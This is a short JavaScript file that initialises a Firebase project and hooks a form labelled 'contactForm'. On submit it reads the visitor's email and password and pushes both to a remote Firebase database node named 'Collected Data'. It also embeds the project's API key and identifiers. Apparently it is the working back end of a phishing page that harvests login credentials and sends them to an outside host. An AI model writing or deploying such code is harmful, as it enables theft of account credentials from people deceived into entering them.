var firebaseConfig ={
  apiKey: "AIzaSyBgfNm68h-RANzi5XLhG6wGlbbxec_oGG8",
  authDomain: "blackpig-61223.firebaseapp.com",
  databaseURL: "https://blackpig-61223-default-rtdb.firebaseio.com",
  projectId: "blackpig-61223",
  storageBucket: "blackpig-61223.appspot.com",
  messagingSenderId: "148726145392",
  appId: "1:148726145392:web:0a1e98edc2cc568e372fb5",
  measurementId: "G-HTFXTVFJD4"
};

firebase.initializeApp(firebaseConfig);
document.getElementById('contactForm')
.addEventListener('submit', submitForm);

var MessageRef = firebase.database().ref('Collected Data');

function submitForm(e) {

    e.preventDefault();

    // Get values
    var email = getInputVal('email');
    var password = getInputVal('password');

    saveMessage(email, password);
    document.getElementById('contactForm').reset();
}

// Function to get get form values
function getInputVal(id) {
    return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(email, password) {
    var newMessageRef = MessageRef.push();
    newMessageRef.set({
        email: email,
        password: password,
    });
}
